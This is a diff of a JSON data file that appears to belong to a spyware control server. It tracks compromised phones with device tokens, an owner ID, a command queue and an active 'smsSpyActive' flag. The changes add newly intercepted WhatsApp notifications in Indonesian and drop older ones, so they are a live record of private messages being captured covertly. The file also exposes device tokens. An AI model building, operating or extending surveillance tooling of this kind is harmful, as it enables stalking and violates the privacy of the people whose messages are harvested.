@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775046744143,
+    "lastSeen": 1775046746923,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13730 pesan): ~ Bot",
+        "content": "⚠️ Masih ada game yang berlangsung di chat ini! Selesaikan dulu atau ketik .nyerah",
+        "time": "01/04 20:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046747590
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15892 pesan dari 10 chat",
+        "time": "01/04 20:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046746587
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "01/04 20:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046105740
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15780 pesan dari 10 chat",
-        "time": "01/04 20:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046105725
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15779 pesan dari 10 chat",
-        "time": "01/04 20:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046105028
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775046745941,
+    "lastSeen": 1775046749050,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
